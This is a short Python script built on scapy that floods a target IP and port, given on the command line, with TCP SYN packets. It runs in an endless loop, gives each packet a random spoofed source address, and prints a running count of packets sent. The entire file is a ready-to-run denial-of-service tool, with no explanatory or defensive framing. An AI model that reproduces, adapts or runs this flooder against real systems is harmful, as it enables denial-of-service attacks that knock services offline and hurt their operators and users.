import sys
import random
import time
from scapy.all import *


def SYNFlood(target, port):
    print "Flooding %s:%i with SYN packets." % (target, port)
    total = 0
    while True:
        i = IP()
        i.src = '.'.join([str(random.randint(1, 254)) for _ in range(4)])
        i.dst = target

        t = TCP()
        t.sport = random.randint(1, 65535)
        t.dport = port
        t.flags = 'S'

        send(i / t, verbose=0)

        total += 1
        print "\rTotal packets sent:\t\t\t%i" % total

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print "Usage: %s <Target IP> <Port>" % sys.argv[0]
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])

    SYNFlood(target, port)
